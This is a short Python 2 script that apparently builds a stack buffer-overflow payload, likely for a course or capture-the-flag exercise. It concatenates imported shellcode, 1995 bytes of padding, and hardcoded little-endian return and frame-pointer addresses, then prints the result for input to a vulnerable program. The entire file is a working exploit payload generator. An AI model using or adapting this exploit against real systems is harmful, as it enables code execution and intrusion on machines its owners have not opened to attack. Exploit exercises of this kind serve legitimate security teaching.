from shellcode import shellcode
from struct import pack

pad = "\x01"*1995
ebp = 0xbffefe0c
addr = 0xbffef5f8

print shellcode + pad + pack("<I", addr) + pack("<I", ebp)
